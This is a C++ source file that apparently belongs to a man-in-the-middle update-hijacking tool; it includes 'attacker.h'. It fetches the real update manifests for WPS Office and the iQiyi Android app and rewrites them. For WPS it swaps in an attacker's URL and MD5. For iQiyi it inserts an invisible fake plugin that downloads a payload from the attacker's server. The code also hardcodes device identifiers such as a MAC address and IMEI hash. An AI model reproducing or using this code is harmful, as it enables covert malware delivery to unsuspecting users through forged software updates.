#include "PreparePacket.h"
#include "Utils/BaseSocket.h"
#include "version.h"
#include "public.h"
#include "cipher/CryptoUtils.h"
#include "FileOper.h"
#include "HttpUtils.h"
#include "attacker.h"
#include "ssl/sslPublic.h"



PreparePacket::PreparePacket() {
	if (mInstance)
	{
		return;
	}
	mInstance = this;
}


PreparePacket::~PreparePacket() {

}


string PreparePacket::prepareWPS(string filename, string updateurl) {
	int ret = 0;

	char buf[0x8000];
	int bufsize = sizeof(buf);

	//12029
	//ERROR_INTERNET_CANNOT_CONNECT
	//12007
	//The server name could not be resolved.
	int size = BaseSocket::readUrl("http://up.wps.kingsoft.com/newupdate/specialpatch/index.ini", buf, bufsize);
	string str = string(buf, size);

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	ret = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, TRUE);

	int pos = 0;
	while (1)
	{
		pos = str.find("\r\nurl=", pos);
		if (pos >= 0)
		{
			pos += lstrlenA("\r\nurl=");
			int nextpos = str.find("\r\n", pos);
			if (nextpos - pos > 0)
			{
				str = str.replace(pos, nextpos - pos, updateurl);
			}
		}
		else {
			break;
		}

		pos = str.find("\r\nmd5=", pos);
		if (pos >= 0)
		{
			pos += lstrlenA("\r\nmd5=");
			int nextpos = str.find("\r\n", pos);
			if (nextpos - pos > 0)
			{
				str = str.replace(pos, nextpos - pos, szmd5);
			}
		}
		else {
			break;
		}
	}

	return str;
}


string PreparePacket::prepareThunder(string ver) {
	int ret = 0;

	char buf[0x8000];
	int bufsize = sizeof(buf);

	//12029
	//ERROR_INTERNET_CANNOT_CONNECT
	//12007
	//The server name could not be resolved.
	string url = "http://upgrade.xl9.xunlei.com/plugin?peerid=&os=10.0.0.0.1&pid=21&v=" +
		ver + "&cid=100022&lng=0804&tag=";
	int size = BaseSocket::readUrl(url, buf, bufsize);
	string str = string(buf, size);

	int pos = 0;

	pos = str.find(",\"tag\":\"", pos);
	if (pos >= 0)
	{
		pos += lstrlenA(",\"tag\":\"");
		int nextpos = str.find("\"", pos);
		if (nextpos - pos > 0)
		{
			return str.substr(pos, nextpos - pos);
		}
	}
	else {
		return "";
	}

	return "";
}





/*
GET up.wps.kingsoft.com/newupdate/specialpatch/index.ini HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*//*;q=0.8
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763
Accept-Encoding: gzip, deflate
Host: up.wps.kingsoft.com
Connection: Keep-Alive
*/



//iface2.iqiyi.com/fusion/3.0/plugin?plugins=5594_2.3_&app_k=2080320204add8e266bfef28948d903c&app_v=11.5.5&platform_id=10&dev_os=4.4.4&dev_ua=Che1-CL10&net_sts=1&qyid=A000004F931A45&cupid_v=3.27.006&psp_uid=&psp_cki=&imei=3f2d48f32b2a847a906f02eb8ab4ea4b&aid=cab8462d329b3a4a&mac=84:db:ac:b6:ac:c8&scrn_scale=2&secure_p=GPhone&secure_v=1&core=5&api_v=7.5&profile=&unlog_sub=0&cust_count=&dev_hw=%7B%22platform_ver%22%3A19%2C%22scrn_size%22%3A4.590000152587891%2C%22gyro%22%3A1%2C%22mem%22%3A1910%2C%22cpu_core%22%3A4%2C%22cpu%22%3A%221209600%22%2C%22display_mem%22%3A%22%22%2C%22gpu%22%3A%22%22%7D&net_ip=&scrn_sts=0&scrn_res=720,1280&scrn_dpi=320&cupid_id=A000004F931A45&psp_vip=0&psp_status=1&app_t=0&province_id=2007&service_filter=&service_sort=&aqyid=A000004F931A45_cab8462d329b3a4a_84ZdbZacZb6ZacZc8&pps=0&pu=&cupid_uid=A000004F931A45&app_gv=&gps=,&lang=zh_CN&app_lm=cn&req_times=0&req_sn=1534320376335
string PreparePacket::prepareIqiyi(LPHTTPPROXYPARAM lphttp) {
	int ret = 0;

	char* buf = new char[0x100000];

	int bufsize = 0x100000;

	string url = "http://iface2.iqiyi.com/fusion/3.0/plugin?"
		"plugins=5594_2.3_&app_k=2080320204add8e266bfef28948d903c&app_v=11.5.5&platform_id=10&dev_os=10.0.0"
		"&dev_ua=Che1-CL10&net_sts=1&qyid=A000004F931A45&cupid_v=3.27.006&psp_uid=&psp_cki="
		"&imei=3f2d48f32b2a847a906f02eb8ab4ea4b&aid=cab8462d329b3a4a&mac=84:db:ac:b6:ac:c8&scrn_scale=2&secure_p=GPhone"
		"&secure_v=1&core=5&api_v=7.5&profile=&unlog_sub=0&cust_count="
		"&dev_hw=%7B%22platform_ver%22%3A19%2C%22scrn_size%22%3A4.590000152587891%2C%22gyro%22%3A1%2C%22mem%22%3A1910%2C%22cpu_core%22%3A4%2C%22cpu%22%3A%221209600%22%2C%22display_mem%22%3A%22%22%2C%22gpu%22%3A%22%22%7D"
		"&net_ip=&scrn_sts=0&scrn_res=720,1280&scrn_dpi=320&cupid_id=A000004F931A45&psp_vip=0"
		"&psp_status=1&app_t=0&province_id=2007&service_filter=&service_sort="
		"&aqyid=A000004F931A45_cab8462d329b3a4a_84ZdbZacZb6ZacZc8&pps=0&pu="
		"&cupid_uid=A000004F931A45&app_gv=&gps=,&lang=zh_CN&app_lm=cn&req_times=0&req_sn=1534320376335";

	int size = BaseSocket::readUrl(url, buf, bufsize);
	string str = string(buf, size);

	delete buf;

	int pos = 0;

	pos = str.find("android.app.fw", pos);
	if (pos >= 0)
	{
		int jsonhdr = 0;
		for (jsonhdr = pos; jsonhdr > 0; )
		{
			if (str.at(jsonhdr) == '{' && str.at(jsonhdr - 1) == '[')
			{
				jsonhdr -= 2;
			}
			// 			else if (str.at[jsonhdr - 1] == '}' || str.at[jsonhdr] == ']')
			// 			{
			// 				jsonhdr -= 2;
			// 			}
			else if (str.at(jsonhdr) == '{')
			{
				break;
			}
			else {
				jsonhdr--;
			}
		}


		int jsonend = 0;
		for (jsonend = pos; jsonend < str.length(); )
		{
			if (str.at(jsonend) == '}' && str.at(jsonend + 1) == ']')
			{
				jsonend += 2;
			}
			// 			else if (str.at[jsonend] == '[' || str.at[jsonend+1] == '{')
			// 			{
			// 				jsonend += 2;
			// 			}
			else if (str.at(jsonend) == '}')
			{
				jsonend++;
				break;
			}
			else {
				jsonend++;
			}
		}

		string json = str.substr(jsonhdr, jsonend - jsonhdr);

		string beforejson = str.substr(0, jsonhdr);

		string endjson = str.substr(jsonend);

		char* lpRespContentFormat =
			"{\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\", \"remove\":0,\"size\":%u,"
			"\"pak_name\":\"android.app.fw\",\"local\":0,\"invisible\":1,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,"
			"\"plugin_ver\":\"%s\",\"plugin_gray_ver\":\"\",\"is_base\":1,\"l_ver\":\"%s\",\"s_pingback\":0,\"c_dl_mn\":0,\"dl_mn_step\":0.0,"
			"\"md5\":\"%s\",\"patch\":[{\"patch_url\":\"http://%s/%s\",\"md5\":\"%s\",\"cdn_type\":0,\"version\":\"%s\"}],"
			"\"priority\":1,\"h5_url\":\"\",\"plugin_type\":0,\"size_64\":0,\"plugin_id\":\"8245\",\"baseplugins\":\"\","
			"\"plugin_name\":\"\xE6\x8F\x92\xE4\xBB\xB6\xE5\x85\xAC\xE5\x85\xB1\xE6\xA8\xA1\xE5\x9D\x97\",\"type\":0,\"desc\":\"\xE6\x8F\x92\xE4\xBB\xB6\xE5\x85\xAC\xE5\x85\xB1\xE6\xA8\xA1\xE5\x9D\x97\",\"p_r\":0,\"c_dl_at\":1,\"uninstall\":0}";

		string pluginver = ANDROID_QIYIVIDEO_PLUGIN_VERSION;

		string lowver = "1.1.1";

		string filepath = Public::getUserPluginPath(lphttp->username);
		string filename = IQIYI_PLUGIN_FILENAME;

		string newfn = filepath + filename + "_new";
		int filesize = FileOper::fileDecryptWriter(filepath + filename, newfn);

		string crc = CryptoUtils::FileCrc32(newfn, 1024, FALSE);

		string szip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

		char szmd5[64] = { 0 };
		unsigned char hexmd5[64] = { 0 };
		filesize = CryptoUtils::getUpdateFileMd5(filepath + filename, szmd5, hexmd5, FALSE);

		char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
		int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
			crc.c_str(), crc.c_str(), szip.c_str(), IQIYI_PLUGIN_FILENAME, filesize, pluginver.c_str(), lowver.c_str(), szmd5,
			szip.c_str(), IQIYI_PLUGIN_FILENAME, szmd5, pluginver.c_str());

		string resultstr = beforejson + lpRespContent + endjson;
#ifdef _DEBUG
		FileOper::fileWriter("test.json", resultstr.c_str(), resultstr.length(), TRUE);
#endif
		return resultstr;
	}
	else {
		return "";
	}

	return "";
}